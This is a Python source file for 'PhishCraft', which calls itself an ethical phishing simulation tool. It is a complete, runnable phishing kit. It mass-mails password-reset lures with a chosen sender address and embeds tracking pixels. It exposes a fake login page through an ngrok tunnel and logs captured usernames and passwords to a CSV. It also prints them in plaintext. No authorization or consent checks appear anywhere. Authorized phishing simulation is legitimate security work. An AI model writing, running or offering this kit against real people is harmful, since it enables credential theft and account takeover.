import argparse
import csv
import json
import os
from pathlib import Path
import sys
from datetime import datetime
import logging
from flask import Flask, request, render_template, redirect
import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pyngrok import ngrok

app = Flask(__name__, template_folder='templates')
logger = logging.getLogger(__name__)

class PhishCraft:
    """Handle phishing email campaigns and credential capture."""
    def __init__(self, output_dir='phishcraft_output', smtp_port=25, flask_port=5000):
        self.output_dir = output_dir
        self.smtp_port = smtp_port
        self.flask_port = flask_port
        self.email_template = None
        self.phish_template = None
        self.redirect_url = None
        self.sender = None
        self.subject = None
        self.tracking_log = os.path.join(self.output_dir, 'tracking.json')
        self.credential_log = os.path.join(self.output_dir, 'credentials.csv')
        self.tunnels = []
        os.makedirs(self.output_dir, exist_ok=True)

    def setup_ngrok(self):
        """Start ngrok tunnel for phishing page."""
        try:
            ngrok.set_auth_token(os.getenv('NGROK_AUTH_TOKEN', ''))
            http_tunnel = ngrok.connect(self.flask_port, bind_tls=True)
            public_url = http_tunnel.public_url
            self.tunnels.append(http_tunnel)
            logger.info(f"Ngrok tunnel started: {public_url}")
            return public_url
        except Exception as e:
            logger.error(f"Error setting up ngrok: {e}")
            return None

    def read_recipients(self, recipient_file):
        """Read recipients from CSV."""
        recipients = []
        try:
            with open(recipient_file, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    if 'email' in row and row['email']:
                        recipients.append(row['email'])
            return recipients
        except Exception as e:
            logger.error(f"Error reading recipients: {e}")
            return []

    def send_phishing_email(self, recipients, public_url):
        """Send phishing emails with tracking pixel."""
        tracking_id = datetime.now().strftime('%Y%m%d%H%M%S')
        try:
            server = smtplib.SMTP('localhost', self.smtp_port)
            with open(os.path.join('templates', self.email_template), 'r', encoding='utf-8') as f:
                email_content = f.read()
            email_content = email_content.replace('{{PHISH_URL}}', f"{public_url}/phish")
            email_content = email_content.replace('{{TRACKING_PIXEL}}', f"{public_url}/track?tid={tracking_id}")

            for recipient in recipients:
                msg = MIMEMultipart()
                msg['From'] = self.sender
                msg['To'] = recipient
                msg['Subject'] = self.subject
                msg.attach(MIMEText(email_content, 'html'))
                server.sendmail(self.sender, recipient, msg.as_string())
                logger.info(f"Sent email to {recipient}")
            server.quit()
            return tracking_id
        except Exception as e:
            logger.error(f"Error sending emails: {e}")
            return None

    def log_tracking(self, tracking_id, ip, user_agent):
        """Log tracking pixel access."""
        entry = {
            'tracking_id': tracking_id,
            'timestamp': datetime.now().isoformat(),
            'ip': ip,
            'user_agent': user_agent
        }
        try:
            with open(self.tracking_log, 'a', encoding='utf-8') as f:
                json.dump(entry, f)
                f.write('\n')
            logger.info(f"Tracked: {ip} opened email (ID: {tracking_id})")
        except Exception as e:
            logger.error(f"Error logging tracking: {e}")

    def save_credentials(self, data):
        """Save captured credentials to CSV."""
        try:
            with open(self.credential_log, 'a', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=['timestamp', 'ip', 'user_agent', 'username', 'password'])
                if f.tell() == 0:
                    writer.writeheader()
                writer.writerow(data)
            logger.info(f"Credentials saved: {data['username']}")
        except Exception as e:
            logger.error(f"Error saving credentials: {e}")

    def generate_summary(self, tracking_count, credential_count):
        """Generate a summary report."""
        summary_file = os.path.join(self.output_dir, 'summary.txt')
        try:
            with open(summary_file, 'w', encoding='utf-8') as f:
                f.write(f"PhishCraft Summary Report - {datetime.now().isoformat()}\n")
                f.write("-" * 50 + "\n")
                f.write(f"Sender: {self.sender}\n")
                f.write(f"Subject: {self.subject}\n")
                f.write(f"Emails Sent: {tracking_count}\n")
                f.write(f"Emails Opened: {self.count_tracking()}\n")
                f.write(f"Credentials Captured: {credential_count}\n")
                f.write("-" * 50 + "\n")
            logger.info(f"Summary saved to {summary_file}")
        except Exception as e:
            logger.error(f"Error saving summary: {e}")

    def count_tracking(self):
        """Count unique tracking pixel accesses."""
        try:
            with open(self.tracking_log, 'r', encoding='utf-8') as f:
                return len(f.readlines())
        except:
            return 0

    def run_server(self):
        """Run Flask server for phishing page and tracking."""
        @app.route('/phish')
        def phish_page():
            return render_template(self.phish_template)

        @app.route('/login', methods=['POST'])
        def login():
            data = {
                'timestamp': datetime.now().isoformat(),
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent'),
                'username': request.form.get('username', ''),
                'password': request.form.get('password', '')
            }
            self.save_credentials(data)
            logger.info(f"Captured: {data['username']}:{data['password']} from {data['ip']}")
            return redirect(self.redirect_url) if self.redirect_url else "Success"

        @app.route('/track')
        def track():
            tracking_id = request.args.get('tid', '')
            self.log_tracking(tracking_id, request.remote_addr, request.headers.get('User-Agent'))
            return '', 204  # Return empty response for tracking pixel

        try:
            app.run(host='0.0.0.0', port=self.flask_port, debug=False)
        except Exception as e:
            logger.error(f"Error running server: {e}")

def main():
    parser = argparse.ArgumentParser(description="PhishCraft: Ethical phishing simulation tool.")
    parser.add_argument('-e', '--email-template', default='email_reset.html', help="Email template file (default: email_reset.html).")
    parser.add_argument('-p', '--phish-template', default='login.html', help="Phishing page template (default: login.html).")
    parser.add_argument('-r', '--recipients', required=True, help="CSV file with recipient emails (column: email).")
    parser.add_argument('-s', '--sender', required=True, help="Sender email address (e.g., alert@company.com).")
    parser.add_argument('-j', '--subject', default='Urgent: Reset Your Password', help="Email subject.")
    parser.add_argument('-u', '--redirect', help="URL to redirect after credential capture.")
    parser.add_argument('-o', '--output-dir', default='phishcraft_output', help="Output directory (default: phishcraft_output).")
    parser.add_argument('--smtp-port', type=int, default=25, help="SMTP port (default: 25).")
    parser.add_argument('--flask-port', type=int, default=5000, help="Flask port (default: 5000).")
    parser.add_argument('--verbose', action='store_true', help="Print detailed logs.")
    args = parser.parse_args()

    # Setup logging
    logging.basicConfig(level=logging.INFO if args.verbose else logging.WARNING,
                        format='%(asctime)s - %(levelname)s - %(message)s')

    # Validate inputs
    if not Path(args.recipients).is_file():
        logger.error(f"Recipient file {args.recipients} not found.")
        sys.exit(1)
    for template in [args.email_template, args.phish_template]:
        if not os.path.exists(os.path.join('templates', template)):
            logger.error(f"Template {template} not found in templates/")
            sys.exit(1)

    # Initialize PhishCraft
    phish = PhishCraft(args.output_dir, args.smtp_port, args.flask_port)
    phish.email_template = args.email_template
    phish.phish_template = args.phish_template
    phish.sender = args.sender
    phish.subject = args.subject
    phish.redirect_url = args.redirect

    # Read recipients
    recipients = phish.read_recipients(args.recipients)
    if not recipients:
        logger.error("No valid recipients found.")
        sys.exit(1)

    # Setup ngrok
    public_url = phish.setup_ngrok()
    if not public_url:
        logger.error("Failed to start ngrok tunnel. Ensure ngrok is installed and configured.")
        sys.exit(1)

    # Send emails
    tracking_id = phish.send_phishing_email(recipients, public_url)
    if not tracking_id:
        logger.error("Failed to send emails.")
        sys.exit(1)

    # Start server
    logger.info(f"Phishing page hosted at: {public_url}/phish")
    logger.info("Waiting for interactions...")
    phish.generate_summary(len(recipients), 0)
    phish.run_server()

if __name__ == "__main__":
    main()